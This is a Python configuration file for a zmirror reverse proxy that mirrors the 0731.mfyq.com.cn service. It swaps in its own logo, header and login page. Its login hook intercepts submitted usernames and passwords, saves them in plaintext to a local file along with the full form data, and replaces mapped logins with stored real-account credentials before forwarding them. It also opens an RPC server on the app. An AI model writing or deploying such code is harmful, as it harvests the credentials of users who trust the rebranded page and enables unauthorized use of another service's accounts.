import re,sys
from config import my_host_port
if sys.platform=='win32':
    'qgb.U' in sys.modules or sys.path.append('E:/QGB/babun/cygwin/bin')
if sys.platform=='linux':
    'qgb.U' in sys.modules or sys.path.append('/home/qgb')
	
from qgb import U,T,N,F,py
from flask import request
from zmirror.zmirror import app
from zmirror import zmirror
zmirror.U=U
def log(parse):
    if not ('wordExcelPdf_download' in parse._remote_url):
        return
    if getattr(parse,'remote_response',''):
        if getattr(parse.remote_response,'headers',''):
            U.pprint(parse.remote_response.headers)

    r='='*99
    U.log(r)

sys.dup=F.dill_load(file=U.gst+'0731.mfyq.dup') or {}
N.rpcServer(port=my_host_port,app=app,key='rpc')

# from flask.ext.admin import Admin
# admin = Admin(app)

@app.route('/mfyq_logo')
@app.route('/extdomains/0731.mfyq.com.cn/mfyq_logo')
def mfyq_logo():
    from flask import send_file
    spLogo='/mifengyuqing/static/logo.png'
    if sys.platform=='win32':spLogo='E:/QGB/!RK'+spLogo
    if sys.platform=='linux':spLogo='/home/qgb'+spLogo
    return send_file(spLogo, mimetype='image/gif')

gdraw={
#  re.compile(r'<div class="header navbar navbar-inverse">[\W\w]*<div class="wrap1">'	,flags=re.IGNORECASE ):'./static/head.html',
 re.compile(r'<div class="header navbar navbar-inverse">[\W\w]*<div class="wrap1">'	,flags=re.IGNORECASE ):F.read('./static/head.html'),
}

gdurl={

}
gre_head=re.compile(r'<div class="header navbar navbar-inverse">[\W\w]*<div class="wrap1">'	,flags=re.IGNORECASE )

gsLogin=F.read('./static/login.html')


def custom_response_text_rewriter(raw_text, content_mime, remote_url):
    # F.dill_dump((raw_text, content_mime, remote_url),file=U.stime()+'  '+T.fileName(remote_url) )
    raw_text = raw_text.replace('https://files.yqt365.com//logo/20170803092821201.jpg', '/mfyq_logo')
    if 'nav pull-right' in raw_text:
            raw_text=T.regexReplace(raw_text,
                gre_head,
                F.read('./static/head.html') )
            # raw_text=T.regexReplace(raw_text,k,v)

        # 
    if remote_url.startswith('http://0731.mfyq.com.cn/log'):
        # if len(raw_text)>12345:
        if '/dwr/interface/LoginDwr.js?v=' in raw_text:
            raw_text=F.read('./static/login.html')#gsLogin
    return raw_text


from urllib.parse import parse_qs,urlencode,quote_plus

def custom_parse_before_request_remote_site(parse):
	if parse.request_data and 'username' in parse.request_data:
		client_query=parse_qs(qs=parse.request_data,keep_blank_values=True)
		if( 'username' in client_query):
			if 'password' not in client_query:
				U.log(client_query)
			if 'password' in client_query:
				username=client_query['username'][0]
				password=client_query['password'][0]
				if (username in sys.dup) and (sys.dup[username][0]==password):
					client_query['password'][0]=sys.dup[username][2]
					client_query['username'][0]=sys.dup[username][1]
					parse.request_data=urlencode(query=client_query, doseq=True)#重建表单
					sys.dup[username].insert(3,U.stime())
					F.dill_dump(obj=sys.dup,file=U.gst+'0731.mfyq.dup')
				else:
					if username in sys.dup:
						sys.dup[username].insert(3,U.py.No(U.stime(),client_query) )
					else:
						sys.dup[username]=[password,username,password,U.py.No('first '+U.stime(),client_query) ]
			# U.log(['=====',parse.request_data])

		# parse.request_data=.replace('1234qwer','xxxxxxxxxxxx')
		# parse.request_data=parse.request_data.replace('1234wxsb','1234qwer')


def custom_our_response(parse,resp):
    if ('wordExcelPdf_download' in parse._remote_url):
        basename='word是doc，excel是xls。导出记得保存为相应的文件后缀名'
        resp.headers["Content-Disposition"] = \
            "attachment;" \
            "filename*=UTF-8''{}".format(   quote_plus(basename.encode('utf-8'))       )

        # resp.headers.set('Content-Disposition', 'attachment;filename="导出记得保存为相应的文件后缀名"')
        # resp.headers.set('Content-Type', 'text/html;charset=GBK')
        # py.pdb()

